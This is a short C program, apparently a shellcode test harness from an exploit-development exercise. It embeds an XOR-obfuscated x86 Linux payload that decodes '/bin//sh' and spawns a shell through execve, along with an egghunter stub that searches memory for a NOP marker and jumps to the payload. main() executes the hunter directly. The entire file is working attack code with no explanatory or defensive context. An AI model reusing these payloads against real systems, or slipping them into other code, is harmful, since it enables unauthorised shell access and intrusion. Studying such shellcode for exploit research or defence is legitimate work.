#include<stdio.h>
#include<string.h>

unsigned char egg[] = \
"\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\x51\xbe\xef\xbe\xad\xde\x68\xc0\x91\xde\xb6\x68\xc0\xdc\xc4\xb0\x31\x34\x24\x31\x74\x24\x04\x89\xe3\xb0\x0b\xcd\x80\x2c\x0a\xcd\x80";

unsigned char hunter[] = \
"\xeb\x15\x58\x48\x81\x38\x90\x90\x90\x90\x75\xf7\x81\x78\xfc\x90\x90\x90\x90\x75\xee\xff\xe0\xe8\xe6\xff\xff\xff";

main() {
	int (*ret)() = (int(*)())hunter;
	ret();
	return 0;
}